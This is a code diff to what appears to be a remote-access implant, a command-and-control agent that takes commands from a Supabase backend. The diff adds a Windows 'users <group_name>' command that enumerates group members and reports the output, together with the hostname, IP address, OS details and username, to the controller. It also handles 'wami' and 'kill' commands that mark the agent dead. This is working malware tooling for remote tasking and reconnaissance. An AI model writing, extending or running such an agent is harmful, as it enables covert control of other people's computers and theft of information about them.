@@ -8,7 +8,7 @@ from .config import SUPABASE_KEY
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
-    from .winAPI import wls, wami  # Import the wls and whoami functions
+    from .winAPI import wls, wami, list_users_in_group  # Import the wls, wami, and list_users_in_group functions
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
@@ -93,6 +93,18 @@ def execute_commands(supabase: Client):
             elif os.name == 'nt' and command_text.lower() == 'wami':
                 try:
                     result = wami()
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle 'users <group_name>' command only if on Windows
+            elif os.name == 'nt' and command_text.lower().startswith('users '):
+                try:
+                    group_name = command_text.split(' ', 1)[1]  # Expecting command to be in format "users [group_name]"
+                    result = list_users_in_group(group_name)
                     status = 'Completed'
                     output = "\n".join(result)
                 except Exception as e:
